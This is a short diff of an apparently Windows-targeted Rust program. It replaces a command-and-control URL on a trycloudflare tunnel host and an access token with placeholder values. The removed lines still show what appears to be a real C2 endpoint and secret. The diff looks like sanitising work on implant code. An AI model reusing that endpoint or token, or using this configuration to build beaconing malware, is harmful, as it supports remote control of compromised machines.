@@ -5,8 +5,8 @@
 use std::ptr;
 use std::time::Duration;
 
-const C2_URL: &str = "https://amanda-became-courage-networks.trycloudflare.com";
-const TOKEN: &str = "dd6b24af121ed7e5a500c34c4450487f";
+const C2_URL: &str = "https://CHANGE-MECHANGE-ME.trycloudflare.com";
+const TOKEN: &str = "00000000000000000000000000000000";
 
 #[cfg(windows)]
 fn main() {
